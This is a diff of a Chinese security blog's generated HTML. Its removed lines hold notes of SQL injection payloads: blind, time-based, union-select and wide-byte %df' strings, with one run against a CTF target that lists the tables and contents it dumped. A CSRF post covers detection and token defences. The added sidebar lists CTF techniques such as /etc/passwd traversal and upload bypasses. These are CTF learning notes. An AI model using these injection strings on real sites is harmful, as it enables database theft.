-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>SQL盲注</p>
-<ul>
-<li>猜数据库名长度?id=1 and(length(database()))&gt;11 –+</li>
-<li>猜数据库名?id=1 and(ascii(substr(database(),1,1)))&gt;14–+</li>
-<li>猜表名 ?id=1 and(ascii(substr((select table_name from infotmaiton_schema.tables where table_schema=databse() limit 0,1),1,1)))&gt;100 –+</li>
-<li>猜列名 ?id=1 and(ascii(substr((select column_name from infomation_schema.columns where table_name=’ ‘limit 0,1),1,1)))&gt;123 –+</li>
-<li>猜内容 ?id=1’ and (ascii(substr(( select 列名 from 表名 limit 0,1),1,1)))=68–+<br>时间盲注</li>
-<li>?id=1 and (if(ascii(substr(databse(),1,1))&gt;100,sleep(11),null))–+</li>
-</ul>
-<p>id=-1’ union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</p>
-<p>id=-1’ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=…#</p>
-<p>爆库id = %df’ union select 1,database() %23<br>得到库名 sae-chinalover<br>爆表id=%df’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 爆表<br>得到表名 ctf,ctf2,ctf3,ctf4,news<br>暴字段ctf2表 %df’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746632 %23<br>得到字段名 id,content<br>暴内容 id=%df’ union select 1,group_concat(id,0x3a,content) from ctf2 %23</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/21/CSRF初识/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/21/CSRF初识/" itemprop="url">CSRF初识</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-21T09:43:10+08:00">
-                2018-03-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p> CSRF漏洞检测：</p>
-<ul>
-<li>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一</li>
-</ul>
-<p>个正常请求的数据包，去掉Referer字段后再重新提交，如果该*提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
-<ul>
-<li>Referer，它记录了该 HTTP 请求的来源地址</li>
-<li><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1></li>
-<li>统一增加一个拦截器来检查 Referer 的值就可以。</li>
-<li>Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。</li>
-<li>，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</li>
-<li>。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</li>
-<li>token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对</li>
-<li>对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a href="http://url?csrftoken=tokenvalue。" target="_blank" rel="noopener">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上 &lt;input type=”hidden” name=”csrftoken” value=”tokenvalue”。</li>
-<li>使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
 
 
           </div>
@@ -1733,6 +669,10 @@ typeof(e.data.iframe != &apos;object&apos;)
 
 
           
+
+  
+
+
 
         </div>
         
@@ -1753,8 +693,17 @@ typeof(e.data.iframe != &apos;object&apos;)
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -1805,6 +754,22 @@ typeof(e.data.iframe != &apos;object&apos;)
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是CTF？"><span class="nav-number">1.</span> <span class="nav-text">什么是CTF？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-养成看源代码的习惯-简单"><span class="nav-number">2.</span> <span class="nav-text">1.养成看源代码的习惯(简单)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag在源代码中-："><span class="nav-number">2.1.</span> <span class="nav-text">flag在源代码中()：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#firebug修改源码绕过本地验证"><span class="nav-number">2.2.</span> <span class="nav-text">firebug修改源码绕过本地验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF中源代码中一般有提示或者有敏感信息，建议养成看源代码的习惯"><span class="nav-number">2.3.</span> <span class="nav-text">CTF中源代码中一般有提示或者有敏感信息，建议养成看源代码的习惯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#这个题真是全程看源代码，快捷方式：F12"><span class="nav-number">2.4.</span> <span class="nav-text">这个题真是全程看源代码，快捷方式：F12</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http头"><span class="nav-number">3.</span> <span class="nav-text">http头():</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#找flag-在请求头，响应头尝试实验室：key究竟在哪里呢？"><span class="nav-number">3.1.</span> <span class="nav-text">找flag:在请求头，响应头尝试实验室：key究竟在哪里呢？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#302跳转的中转网页，burp抓包在HTTP-history中找本应该访问的网站链接-为了方便寻找可以先clear一下历史-简单方法用firefox右键查看元素的查看网络中找到302跳转的网页，寻找flag"><span class="nav-number">3.2.</span> <span class="nav-text">302跳转的中转网页，burp抓包在HTTP history中找本应该访问的网站链接(为了方便寻找可以先clear一下历史),简单方法用firefox右键查看元素的查看网络中找到302跳转的网页，寻找flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如果题目中遇到只能某某ip才能访问-ip伪造-，修改或添加http请求头的X-Forwarded-For为题目允许的Ip地址-实验室：本地的诱惑"><span class="nav-number">3.3.</span> <span class="nav-text">如果题目中遇到只能某某ip才能访问(ip伪造)，修改或添加http请求头的X-Forwarded-For为题目允许的Ip地址,实验室：本地的诱惑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目中说为了外国人的话：确保Accept-Language中有en-US-没有就自己加，如果说了只为了的话，就删掉其它的语言类型。"><span class="nav-number">3.4.</span> <span class="nav-text">题目中说为了外国人的话：确保Accept-Language中有en-US  没有就自己加，如果说了只为了的话，就删掉其它的语言类型。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#只能用某种浏览器访问，直接修改user-agent为对应浏览器名字"><span class="nav-number">3.5.</span> <span class="nav-text">只能用某种浏览器访问，直接修改user-agent为对应浏览器名字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie的修改"><span class="nav-number">3.6.</span> <span class="nav-text">Cookie的修改</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Referer来源伪造"><span class="nav-number">3.7.</span> <span class="nav-text">Referer来源伪造</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含"><span class="nav-number">4.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#读取敏感文件：如直接-etc-passwd来读取本地文件内容，其他敏感文件的读取是类似的"><span class="nav-number">4.1.</span> <span class="nav-text">读取敏感文件：如直接../../../../../etc/passwd来读取本地文件内容，其他敏感文件的读取是类似的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#包含Apache日志文件"><span class="nav-number">4.2.</span> <span class="nav-text">包含Apache日志文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程包含shell"><span class="nav-number">4.3.</span> <span class="nav-text">远程包含shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用PHP封装协议读取文件和写入PHP文件"><span class="nav-number">4.4.</span> <span class="nav-text">使用PHP封装协议读取文件和写入PHP文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配合文件上传漏洞："><span class="nav-number">4.5.</span> <span class="nav-text">配合文件上传漏洞：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#暴力破解：burpsuite暴力破解教程"><span class="nav-number">5.</span> <span class="nav-text">暴力破解：burpsuite暴力破解教程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传"><span class="nav-number">6.</span> <span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看网页源码，很清楚看到是前端JS控制的话，那么直接禁用-JavaScript就可以上传php文件了，"><span class="nav-number">6.1.</span> <span class="nav-text">查看网页源码，很清楚看到是前端JS控制的话，那么直接禁用        JavaScript就可以上传php文件了，</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#或者可以用burpsuite通过拦截数据包，修改filenmae后文件名后缀为php"><span class="nav-number">6.2.</span> <span class="nav-text">或者可以用burpsuite通过拦截数据包，修改filenmae后文件名后缀为php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-jpg-php"><span class="nav-number">6.3.</span> <span class="nav-text">1.jpg.php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-php-00-jpg"><span class="nav-number">6.4.</span> <span class="nav-text">1.php%00.jpg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-php-jpg"><span class="nav-number">6.5.</span> <span class="nav-text">1.php;.jpg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后缀名修改为php2-php3-php4-php5-phps-pht-phtm-phtml（php的别名）"><span class="nav-number">6.6.</span> <span class="nav-text">后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#抓包修改Content-Type里的multipart-form-data为Multipart-form-data（大小写绕过）"><span class="nav-number">6.7.</span> <span class="nav-text">抓包修改Content_Type里的multipart/form-data为Multipart/form-data（大小写绕过）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传过后通过显示的路径进行访问，或者右键文件属性里查找。"><span class="nav-number">6.8.</span> <span class="nav-text">上传过后通过显示的路径进行访问，或者右键文件属性里查找。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9"><span class="nav-number">6.9.</span> <span class="nav-text">9.</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#备份文件类型的-不难"><span class="nav-number">7.</span> <span class="nav-text">备份文件类型的(不难)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JS类"><span class="nav-number">8.</span> <span class="nav-text">JS类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#js自动刷新"><span class="nav-number">8.1.</span> <span class="nav-text">js自动刷新</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JS跳转："><span class="nav-number">8.2.</span> <span class="nav-text">JS跳转：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#js加解密"><span class="nav-number">8.3.</span> <span class="nav-text">js加解密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AAencode"><span class="nav-number">8.4.</span> <span class="nav-text">AAencode:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JSFUCK"><span class="nav-number">8.5.</span> <span class="nav-text">JSFUCK:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">8.6.</span> <span class="nav-text">XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见的编码要掌握"><span class="nav-number">9.</span> <span class="nav-text">常见的编码要掌握</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码审计-先理解完bugku的代码审计题"><span class="nav-number">10.</span> <span class="nav-text">代码审计(先理解完bugku的代码审计题)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-get-contents-php-input-的妙用"><span class="nav-number">10.1.</span> <span class="nav-text">file_get_contents(php://input)的妙用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码执行"><span class="nav-number">10.2.</span> <span class="nav-text">代码执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#eval："><span class="nav-number">10.3.</span> <span class="nav-text">eval：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#例题-bugku的本地包含但是题现在坏了：-eval-“var-dump-a-”"><span class="nav-number">10.4.</span> <span class="nav-text">例题. bugku的本地包含但是题现在坏了： eval(“var_dump($a);”);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行"><span class="nav-number">10.5.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#assert"><span class="nav-number">10.6.</span> <span class="nav-text">assert():</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化"><span class="nav-number">10.7.</span> <span class="nav-text">反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入"><span class="nav-number">11.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于联合查询的注入"><span class="nav-number">11.1.</span> <span class="nav-text">基于联合查询的注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">11.2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#布尔盲注"><span class="nav-number">11.3.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#时间盲注"><span class="nav-number">11.4.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#外带通道注入-了解"><span class="nav-number">11.5.</span> <span class="nav-text">外带通道注入(了解)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by注入"><span class="nav-number">11.6.</span> <span class="nav-text">order by注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#万能登陆-举了一些常见的"><span class="nav-number">11.7.</span> <span class="nav-text">万能登陆(举了一些常见的)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常识"><span class="nav-number">12.</span> <span class="nav-text">常识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP源码泄露"><span class="nav-number">12.1.</span> <span class="nav-text">PHP源码泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#robots-txt"><span class="nav-number">12.2.</span> <span class="nav-text">robots.txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seeion与cookie"><span class="nav-number">12.3.</span> <span class="nav-text">seeion与cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql约束攻击-好理解-："><span class="nav-number">12.4.</span> <span class="nav-text">sql约束攻击(好理解)：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#逻辑漏洞-简单"><span class="nav-number">13.</span> <span class="nav-text">逻辑漏洞(简单)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cms"><span class="nav-number">14.</span> <span class="nav-text">cms</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正则表达式"><span class="nav-number">15.</span> <span class="nav-text">正则表达式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安利"><span class="nav-number">16.</span> <span class="nav-text">安利</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1945,6 +910,10 @@ typeof(e.data.iframe != &apos;object&apos;)
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
